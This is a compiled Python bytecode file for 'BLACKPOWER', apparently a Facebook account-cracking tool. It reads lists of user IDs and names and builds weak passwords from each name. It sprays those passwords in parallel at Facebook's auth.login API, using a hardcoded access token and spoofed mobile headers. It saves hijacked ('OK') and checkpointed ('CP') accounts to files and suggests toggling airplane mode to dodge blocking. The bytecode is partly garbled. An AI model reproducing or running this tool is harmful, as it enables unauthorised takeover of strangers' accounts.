�
    +d�6  �                   �  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZ	 d dl	Z	nG# e
$ r?  ej        d�  �          ej        d�  �         	 d dl	Z	n# e
$ r  ed�  �         Y nw xY wY nw xY wd dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ d d
lmZ d dl	mZ d dl m!Z" d dl#m$Z%  e&dd�  �        �'                    �   �         �(                    �   �         Z)n
#  dgZ)Y nxY w e&dd�  �        �'                    �   �         �(                    �   �         Z*n
#  dgZ*Y nxY wg g d d d g g g g g g g g f\  Z+Z,a-a.a/Z0Z1Z2Z3Z4Z5Z6Z7dZ8dZ9dZ:dZ;dZ<dZ=dZ>dZ?dZ@dZAdZBdZCdZDdZEdZFdZGdZHdZ@dZ:dZIdZ=dZJdZKdZ?dZ:dZIdZDdZLdZMdZNdZOdZ>dZP ejQ        eGeDeHe>eFg�  �        ZRdd d!d"d#d$d%d&d'd(d)d*d+�ZSdd d!d"d#d$d%d&d'd(d)d*d,�ZTej        �U                    �   �         jV        ZWeS eXej        �U                    �   �         jY        �  �                 ZZej        �U                    �   �         j[        Z\d- eXeW�  �        z   d.z    eXeZ�  �        z   d.z    eXe\�  �        z   d/z   Z]d0 eXeW�  �        z   d.z    eXeZ�  �        z   d.z    eXe\�  �        z   d/z   Z^d1Z_d2� Z`d3� Zad4� Zbd5� Zcd6� Zdd7� Zed8� Zfd9� Zgd:� Zhd;� Zid<� Z`d=� Zaejd>k    r\ ej        d?�  �          ejk        d@�  �         n#  Y nxY w ejk        dA�  �         n#  Y nxY w ej        dB�  �          ee�   �          dS dS )C�    Nzpip install rich�   u6   [✓] Internet Eror ,Install Manual (pip install rich))�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columnszuser.txt�rzIMozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20z	user2.txtz[93mz[1;92mz[92mz[95mz[1;96mz[1;95mz[0;00mz[1;93mz[0mz[1;91mz[00mz[1;90mu   [•]�Januari�Februari�Maret�April�Mei�Juni�Juli�Agustus�	September�Oktober�November�Desember)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04�05�06�07�08�09r#   r$   r%   zOK-�-z.txtzCP-�100007061760822c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S �N�
g{�G�z�?��sys�stdout�write�flush�time�sleep��z�es     �BLACKPOWER.py�jalanr?   K   �Q   � ���X�M�M��c�j�&�&�q�)�)�)�#�*�*:�*:�*<�*<�*<�T�Z��=M�=M�=M�=M�M�M�    c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S �Nr3   g���Q��?r4   r;   s     r>   �mlakurD   M   r@   rA   c                  �.   � t          j        d�  �         d S )N�clear)�os�system� rA   r>   rF   rF   P   s   � ���7�����rA   c                  �"   � t          �   �          d S )N)�menurI   rA   r>   �backrL   R   s   � ������rA   c                  �P   � t          �   �          t          dt          z  �  �         d S )Nz%s
[93;1m

)rF   r
   �hrI   rA   r>   �bannerrO   T   s4   � ������ ��
� � � � � rA   c                  �  � t          �   �          t          d�  �         t          dt          z  �  �         t          dt          z  �  �         t          t          dz   �  �        } | dv rt          �   �          d S | dv r$t          j        d�  �         t          �   �          d S t          j        d�  �         t          �   �          d S )	N� uL  %s      [1;90m[[1;97m>_[1;90m][1;97m V[1;90m:[1;97m 1.0
      [1;96m

      
[1;96m

███╗   ███╗██████╗    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗
████╗ ████║██╔══██╗   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝
██╔████╔██║██████╔╝   ██████╔╝██║     ███████║██║     █████╔╝ 
██║╚██╔╝██║██╔══██╗   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ 
██║ ╚═╝ ██║██║  ██║██╗██████╔╝███████╗██║  ██║╚██████╗██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                              

     
      [1;96m 
      [1;96m 

[1;93m─━[1;97mSTATUS[1;90m : [1;97m[[1;92mFREE FOR ALL❤️✓[1;97m][1;97m TEAM 😅[1;90m : [1;97m1778❤️[1;93m━─
[1;90m───────────────────────────────────────────────────
   [1;90m[[1;97m>_[1;90m][1;97m No thing❤️(BLACK)
   [1;90m[[1;97m>_[1;90m][1;97m No thing❤️(BLACK)
   [1;90m[[1;97m>_[1;90m][1;97m No thing❤️❤️(BLACK)
   [1;90m[[1;97m>_[1;90m][1;97m No thing❤️(BLACK)
   [1;90m[[1;97m>_[1;90m][1;97m No thing❤️(BLACK)
   [1;90m[[1;97m01[1;90m][1;97m Crack File Cloning(BEST🗂️)
   [1;90m[[1;97m00[1;90m][1;97m EXIT
u�   %s[1;90m───────────────────────────────────────────────────z:   [1;90m[[1;97m>_[1;90m][1;97m ENTER[1;90m :[1;92m �r   r&   )�0�00�xdg-open https://t.me/NN8F8zhttps://t.me/NN8F8)	rO   r
   rN   �input�x�File2rG   rH   �exit)�farhans    r>   rK   rK   X   s�   � ������r����� D� FG�H� I� I� I� �  s�  uv�  w�  x�  x�  x�
��`�`�
a�
a��
�j����'�'�'�'�'��
����)�)�*�*�*��&�&�&�&�&��)� �!�!�!��&�&�&�&�&rA   c                  �b  � t          �   �          t          �   �          	 t          d�  �        } t          | d�  �        �                    �   �         D ].}t
          �                    |�                    �   �         �  �         �/t          �   �          d S # t          $ r t          d| z  �  �         Y d S w xY w)Nu   [1;90m───────────────────────────────────────────────────
[1;93m─━㋱[1;97mSTATUS[1;90m : [1;92mPremium[1;97m TEAM1778[1;90m : [1;97m No thing💔[1;93m㋱━─
[1;90m───────────────────────────────────────────────────
   [1;90m[[1;97m>_[1;90m][1;97m Nawe filakat dane📂[1;90m :[1;92m r   z/
   [1;90m[[1;97m>_[1;90m][1;97m File Error)rF   rO   rV   �open�	readlines�id�append�strip�setting�IOErrorrY   )�fileX�lines     r>   rX   rX   t   s�   � ��7�7�7�	�8�8�8�Q��  I	�  J	�  J	�E��U�C� � �*�*�,�,� � ���Y�Y�t�z�z�|�|������I�I�I�I�I��
� Q� Q� Q��	G��	O�P�P�P�P�P�P�Q���s   �A.B �B.�-B.c                  ��  � t          dt          z  �  �         t          t          dz   �  �        } | dv r%t          D ]}t
          �                    |�  �         �nO| dv r&t          D ]}t
          �                    d|�  �         �n%t          dt          z  �  �         t          �   �          t          dt          z  �  �         t          t          dz   �  �        }|dv rt          �                    d	�  �         nt          �                    d	�  �         t          d
t          z  �  �         t          t          dz   �  �        }|dv rt          �   �          d S |dv r$t          j        d�  �         t          �   �          d S d S )Nu�  %s[1;90m───────────────────────────────────────────────────
   [1;90m[[1;97m01[1;90m][1;97m slow(best)
   [1;90m[[1;97m02[1;90m][1;97m fast(not working)
   [1;90m[[1;97m02[1;90m][1;97m Random (lol)
[1;90m───────────────────────────────────────────────────z?   [1;90m[[1;97m>_[1;90m][1;97m Select one[1;90m :[1;92m rR   )r   r'   r   z%s [1;33mwrong Inputuw  %s[1;90m───────────────────────────────────────────────────
   [1;90m[[1;97m01[1;90m][1;97m  SELECT 1 HERE
[1;90m─────────────────────────────────────────────────── z?   [1;90m[[1;97m>_[1;90m][1;97m SELECT ONE[1;90m :[1;92m �apiu�   %s [38;5;248m────────────────────────────────────────────────────────────[92;1m zv   [1;90m[[1;97m>_[1;90m][1;97m Do you want to continue? [1;90m([1;92mY[1;90m/[1;91mT[1;90m)[1;90m :[1;92m ��y�Y)�t�TrU   )r
   rN   rV   rW   r^   �id2r_   �insertrY   �method�passwrdrG   rH   )�mubashar�bacot�baloch�fasts       r>   ra   ra      s�  � ��  U�  WX�  Y�  Z�  Z�  Z��!�g�g�h�h���
���� � �e��:�:�e�������*���� � �e��:�:�a������� �%�q�)�*�*�*��&�&�&��  Y�  [\�  ]�  ^�  ^�  ^�
��e�e�
f�
f��
�j����-�-�������-�-������  ^�  `a�  b�  c�  c�  c��a�  j�  j�  	k�  	k���I���	�)�)�)�)�)�
�i����)�)�*�*�*��&�&�&�&�&� �rA   c                  �\	  � t          �   �          t          �   �          t          dt          z  �  �         t          t          dz   t          z   dz   t          z   dz   t          t          t          �  �        �  �        z   �  �         t          t          dz   �  �         t          dt          z  �  �         t          d��  �        5 } t          D �]j}|�
                    d�  �        d	         |�
                    d�  �        d
         �                    �   �         }}|�
                    d�  �        d	         }g }t          |�  �        dk     �rLt          |�  �        dk     r�n�|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         �n_t          |�  �        dk     r|�                    |�  �         �n5|�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         dt          v r| �                    t          ||�  �         ��N| �                    t          ||�  �         ��l	 d d d �  �         n# 1 swxY w Y   t          d�  �         t          dt          z  �  �         t!          t          dz   �  �        }|dv rt#          �   �          d S t#          �   �          d S )Nu�  %s      [1;90m[[1;97m>_[1;90m][1;97m V[1;90m:[1;97m 1.0
      [1;96m

███╗   ███╗██████╗    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗
████╗ ████║██╔══██╗   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝
██╔████╔██║██████╔╝   ██████╔╝██║     ███████║██║     █████╔╝ 
██║╚██╔╝██║██╔══██╗   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ 
██║ ╚═╝ ██║██║  ██║██╗██████╔╝███████╗██║  ██║╚██████╗██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                              

 [1;96m[1;96m[1;96m[1;93m─━㋱[1;97mSTATUS[1;90m : [1;97m[[1;92mFREE FOR ALL❤️✓[1;97m][1;97m TEAM1778[1;90m : [1;97mNO THING🦧[1;93m━─
[1;90m───────────────────────────────────────────────────[92;1m � z3 [1;90m[[1;97m>_[1;90m][1;97m Total ID :[1;2m z�   [1;90m[[1;97m>_[1;90m][1;97m IF NO RESULTS THEN SIMPLY TURN OFF/ON AIRPLANE MODE
   [1;90m[[1;97m>_[1;90m][1;97m STARTED...u�   %s[1;90m───────────────────────────────────────────────────[92;1m �   )�max_workers�|r   r   �   �   r%   �123�1234�12345�123456�123123�123321�1122�1221�112233�11223344�
1122334455rf   rQ   zi   [1;90m[[1;97m>_[1;90m][1;97m Ingin Kelua [1;90m([1;92mY[1;90m/[1;91mT[1;90m)[1;90m :[1;92m rg   )rF   rO   r
   rN   rW   �str�lenr^   �tredrl   �split�lowerr_   rn   �submit�crack2rV   rY   )�pool�yuzong�idf�nmf�frs�pwv�exitsss          r>   ro   ro   �   s�  � ���������� 
@� BC�
D� 
E� 
E� 
E� �q��u�Q�w�s�{�1�}�Y�Y�Z]�^a�bd�^e�^e�Zf�Zf�f�g�g�g��q�  
k�  k�  l�  l�  l��  ~�  @A�  B�  C�  C�  C�
�r���� / �d�� . � . �f��\�\�#���q�!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�	�3�	�#�h�h�q�j�j�
�3�x�x��z�z�	��Z�Z��_�_�_��Z�Z��D������Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��H������Z�Z��H������Z�Z��H������Z�Z��F�
�����Z�Z��F�
�����Z�Z��H������Z�Z��J������Z�Z��L� �!�!�!�!�
 �3�x�x��z�z��Z�Z��_�_�_�_��Z�Z��_�_�_��Z�Z��D������Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��H������Z�Z��H������Z�Z��H������Z�Z��F�
�����Z�Z��F�
�����Z�Z��H������Z�Z��J������Z�Z��L� �!�!�!� �v�o�o��K�K��s�3������K�K��s�3�����]. �/ � / � / � / � / � / � / � / � / � / � / ���� / � / � / � / �` �r�����  ~�  @A�  B�  C�  C�  C�
��  _�  _�  `�  `��
�i����&�&�&�&�&��&�&�&�&�&s   �M4Q�Q�	Qc                 �  � t          j        t          t          t          t
          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          d|�dt          �dt          t          �  �        �dt          �dt          �dt          |�  �        �t          |�  �        �t           ��d	�
�  �         t"          j        �                    �   �          t          j        t(          �  �        �                    dd�  �        }t-          j        �   �         }|D �]}	 t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        t          t          j        dd�  �        �  �        dd|ddd�}|�                    dt          | �  �        z   dz   t          |�  �        z   dz   |��  �        }	d|	�                    �   �         d         v r�dt6          v r1t8          �                    | dz   |z   �  �         t=          | |�  �         n|t          dt
          �d| �d|�d��  �         t?          d t@          z   d!�  �        �!                    | dz   |z   dz   �  �         t8          �                    | dz   |z   �  �         t          d"z  a n�d#|	j"        v rgd$|	j"        v r^t          dt          �d| �d|�d��  �         t?          d%tF          z   d!�  �        �!                    | dz   |z   dz   �  �         t          d"z  a n1���# t,          j$        j%        $ r tM          j'        d&�  �         Y ��w xY wt          d"z  ad S )'N�d   �%�z   [MR_B_L_4_C_K] �/z  CP/z | OK/z : ru   )�endr3   rQ   g    �sAg    8�|Ai N  i@�  �	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAz!application/x-www-form-urlencoded�Liger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typez
user-agentzcontent-typezx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)�headerszwww.facebook.com�	error_msg�yarx   z   [BLACK-OK] z        zCP/�ar   �session_key�EAABzOK/�   )(�random�choice�u�k�kk�brN   �hh�loopr�   rl   r
   �ok�cp�intr�   rW   r5   r6   r8   �ugen�replace�requests�Session�randint�get�json�oprek�akunr_   �cekerr\   �cpcr7   �text�okc�
exceptions�ConnectionErrorr9   r:   )
r�   r�   �bi�pers�fff�ua�ses�pw�head�resps
             r>   r�   r�   �   s�  � ��m�Q�q��A�a��O�$�$���S���S�����
����b�b�b����c�#�h�h�h�h�r�r�r�RT�RT�RT�UX�Y]�U^�U^�U^�_b�cf�_g�_g�_g�hi�hi�j�ps�t�t�t�t�ux�u�  vF�  vF�  vH�  vH�  vH��m�D���!�!�$�r�*�*�������� � �R��(+�F�N�:�z�,R�,R�(S�(S�eh�io�iw�x}�  @E�  jF�  jF�  fG�  fG�  Y\�  ]c�  ]k�  lq�  sx�  ]y�  ]y�  Yz�  Yz�  Wb�  |_�  oq�  Cf�  |C�  D�  D�4�
�'�'�S�TW�X[�T\�T\�\�]i�i�jm�np�jq�jq�q�  sc�  c�  mq�'�  r�  r�4��D�I�I�K�K��4�4�4��u�}�}�	�[�[��S�������
�3�r�]�]�]�]�
�U�a�a�a����B�B�B�7�8�8�8�	�%��)�C�����s�3�w�r�z�$��/�/�/�	�[�[��S���������U�R�	�E����"�"�v���':�':�	�E�Q�Q�Q�s�s�s�2�2�2�
6�7�7�7���s��3�����c�#�g�b�j��o�.�.�.���E�B�	�E���	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �%E:L�!A.L�(L?�>L?c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S r2   r4   r;   s     r>   r?   r?     �\   � ���X� � ���
��������
�������
�4������ rA   c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S rC   r4   r;   s     r>   rD   rD   	  r�   rA   �__main__zgit pull�CP�OKrU   )lr�   �bs4r�   rG   r5   r�   �datetimer9   �re�rich�ImportErrorrH   r:   rY   �
rich.tabler   �me�rich.consoler   �solr   �parser�concurrent.futuresr   r�   r   �gp�
rich.panelr	   �nelr
   �cetak�rich.markdownr   �mark�rich.columnsr   �colr\   �read�
splitlinesr�   �ugen2r^   rl   r�   r�   r�   r�   r�   rn   �	lisensiku�	taplikasi�tokenku�uid�lisensikunirW   r�   rN   r�   r�   r�   r�   �p�P�J�S�N�I�C�M�U�K�Q�ff�G�II�m�O�H�warr�   �B�dic�dic2�now�day�tglr�   �month�bln�year�thnr�   r�   �my_idr?   rD   rF   rL   rO   rK   rX   ra   ro   r�   �__name__�mkdirrI   rA   r>   �<module>r     s�  �� 8� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7�A�������� A� A� A�
����������A����A��+�+�+�+��� A� A� A��$�?�@�@�@�@�@�A������A���� #� "� "� "� "� "� '� '� '� '� '� '� '� '� '� '� '� '� 9� 9� 9� 9� 9� 9� $� $� $� $� $� $� #� #� #� #� #� #� � � � � � � *� *� *� *� *� *� '� '� '� '� '� '��4�
�3���$�$�&�&�1�1�3�3�D�D�� [�Z�[�t�t�t�����D��S�!�!�&�&�(�(�3�3�5�5�E�E�� \�[�\�u�u�u����QS�TV�WX�YZ�[\�]_�`b�ce�fh�ik�ln�oq�rt�Qt� O��3�t�B�r�$�u�V�I�i���K��������������������������������������������������������������������F�M�1�Q�q��1�+�������G��&�U[�`i�ny�  @I�  OY�  _i�  j�  j���J�G��e�QW�]c�ir�  yD�  JS�  Yc�  is�  t�  t��������!��	�3�3�x� �$�$�&�&�,�-�-�/��������"���C�C��H�H�n�S����S���!�#�%�c�c�#�h�h�.�v�5���C�C��H�H�n�S����S���!�#�%�c�c�#�h�h�.�v�5����N� N� N�N� N� N�� � �� � �� � �	� 	� 	�8	Q� 	Q� 	Q�	� 	� 	�6G	� G	� G	�R	� 	� 	�B� � �
� � � �Z���
���:�����R�X�d�^�^�^�^���������R�X�d�^�^�^�^��������
���(�)�)�)�������� �sc   �+ �%A/�A�A/�A)�&A/�(A)�)A/�.A/�(0C �C �#0D �D�3K �K�K �K 